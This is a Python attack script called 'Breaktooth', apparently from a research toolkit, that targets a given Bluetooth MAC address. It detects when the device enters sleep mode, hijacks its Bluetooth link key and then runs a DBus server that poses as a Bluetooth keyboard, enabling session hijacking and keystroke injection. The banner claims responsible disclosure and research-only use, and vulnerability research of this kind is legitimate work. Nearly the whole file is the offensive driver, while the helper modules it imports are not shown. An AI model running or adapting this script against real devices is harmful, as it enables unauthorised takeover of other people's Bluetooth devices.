#!/usr/bin/python3

import os
import sys
import time
import tools.emulator.rules.constants as consts
from gi.repository import GLib
from dbus.mainloop.glib import DBusGMainLoop
from tools.emulator.kb_server import KbServer
from tools.bluetooth.socket import BTSocket
from tools.bluetooth.sleep_detector import sleep_detector
from colorama import init, Fore, Style
init()


BREAKTOOTH_LOGO = f"""{Fore.GREEN}

 /$$$$$$$                               /$$        /$$                           /$$     /$$      
| $$__  $$                             | $$       | $$                          | $$    | $$      
| $$  \ $$  /$$$$$$  /$$$$$$   /$$$$$$ | $$   /$$/$$$$$$    /$$$$$$   /$$$$$$  /$$$$$$  | $$$$$$$ 
| $$$$$$$  /$$__  $$/$$__  $$ |____  $$| $$  /$$/_  $$_/   /$$__  $$ /$$__  $$|_  $$_/  | $$__  $$
| $$__  $$| $$  \__/ $$$$$$$$  /$$$$$$$| $$$$$$/  | $$    | $$  \ $$| $$  \ $$  | $$    | $$  \ $$
| $$  \ $$| $$     | $$_____/ /$$__  $$| $$_  $$  | $$ /$$| $$  | $$| $$  | $$  | $$ /$$| $$  | $$
| $$$$$$$/| $$     |  $$$$$$$|  $$$$$$$| $$ \  $$ |  $$$$/|  $$$$$$/|  $$$$$$/  |  $$$$/| $$  | $$
|_______/ |__/      \_______/ \_______/|__/  \__/  \___/   \______/  \______/    \___/  |__/  |__/
{Style.RESET_ALL}
{Fore.CYAN}Breaking Security & Privacy in Bluetooth Power-Saving Mode{Style.RESET_ALL}
{Fore.RED}-------------------------------------------------------{Style.RESET_ALL}

{Fore.YELLOW}[*]{Style.RESET_ALL} Target: {Fore.CYAN}Bluetooth Sleep Mode{Style.RESET_ALL}
{Fore.YELLOW}[*]{Style.RESET_ALL} Method: {Fore.CYAN}Session Hijacking{Style.RESET_ALL}
{Fore.YELLOW}[*]{Style.RESET_ALL} Impact: {Fore.CYAN}All CIA (Confidentiality, Integrity, Availability) Triad{Style.RESET_ALL}
{Fore.YELLOW}[*]{Style.RESET_ALL} Disclosure: {Fore.CYAN}Reported to Bluetooth SIG (May 2024){Style.RESET_ALL}
{Fore.GREEN}[+]{Style.RESET_ALL} Attack Tool: {Fore.CYAN}Low-Cost and Reproducible Toolkit Ready{Style.RESET_ALL}

{Fore.RED}Disclaimer:{Style.RESET_ALL} Research purposes only. Responsible disclosure in progress.
"""

def print_status(message, status_type="info"):
    if status_type == "info":
        prefix = f"{Fore.YELLOW}[*]{Style.RESET_ALL}"
    elif status_type == "success":
        prefix = f"{Fore.GREEN}[+]{Style.RESET_ALL}"
    elif status_type == "error":
        prefix = f"{Fore.RED}[-]{Style.RESET_ALL}"
    print(f"{prefix} {message}")

if len(sys.argv) < 2:
    print("You should have to set the target mac address of bluetooth device.")
    sys.exit(1)

try:
    if not os.geteuid() == 0:
        sys.exit("Only root can run this script")

    print(BREAKTOOTH_LOGO)

    bt_addr = sys.argv[1]
    print_status(f"Target Bluetooth Address: {Fore.CYAN}{bt_addr}{Style.RESET_ALL}")

    print_status("Initiating sleep detection...")
    sleep_detector(bt_addr=bt_addr)

    print_status("Attempting bluetooth link key hijacking...", "info")
    # hijack bluetooth link key
    bt_sock = BTSocket(proto=consts.BTPROTO_L2CAP, bt_addr=bt_addr)
    bt_sock.set_security_level(level=consts.BT_SECURITY_HIGH)
    bt_sock.key_hijacking()
    print_status("Link key hijacking successful!", "success")

    # sleep
    print_status("Waiting for 5 seconds...", "info")
    time.sleep(5)

    # boot dbus server as bluetooth keyboard
    print_status("Starting DBus server as bluetooth keyboard...", "info")
    DBusGMainLoop(set_as_default=True)
    myservice = KbServer(mac_address=sys.argv[1])
    loop = GLib.MainLoop()
    print_status("Server started successfully. Running main loop...", "success")
    loop.run()
except KeyboardInterrupt:
    print_status("\nOperation cancelled by user", "error")
    sys.exit()
except Exception as e:
    print_status(f"An error occurred: {str(e)}", "error")
    sys.exit(1)
